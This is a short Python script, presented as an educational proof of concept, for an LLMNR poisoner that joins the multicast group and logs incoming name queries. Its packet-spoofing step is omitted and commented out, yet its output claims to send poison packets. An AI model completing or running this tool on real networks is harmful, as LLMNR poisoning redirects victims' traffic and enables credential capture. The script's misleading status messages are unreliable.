import socket
import struct
import argparse

# NetPhantom - LLMNR Poisoner
# Educational Proof-of-Concept
# Listens for LLMNR multicast requests and responds to them, redirecting to our IP.

MCAST_GRP = '224.0.0.252'
MCAST_PORT = 5355

def start_poisoner(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', MCAST_PORT))
    
    # Join multicast group
    mreq = struct.pack("4sl", socket.inet_aton(MCAST_GRP), socket.INADDR_ANY)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

    print(f"[*] NetPhantom Active. Listening on {MCAST_GRP}:{MCAST_PORT}")
    print(f"[*] Poisoning responses to point to: {target_ip}")

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            # Simple check for LLMNR structure (Transaction ID, Flags, Questions)
            if len(data) > 12:
                # Craft a malicious response (simplified for PoC)
                # In real scenario: Parse query name, construct valid LLMNR response packet
                print(f"[+] Received query from {addr[0]}. Sending poison packet...")
                # Note: Full packet construction omitted for brevity in PoC, 
                # but this demonstrates the listening capability.
                # send_poison(sock, data, addr, target_ip)
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NetPhantom - LLMNR Poisoner")
    parser.add_argument("--ip", required=True, help="IP to redirect traffic TO (your IP)")
    args = parser.parse_args()

    start_poisoner(args.ip)
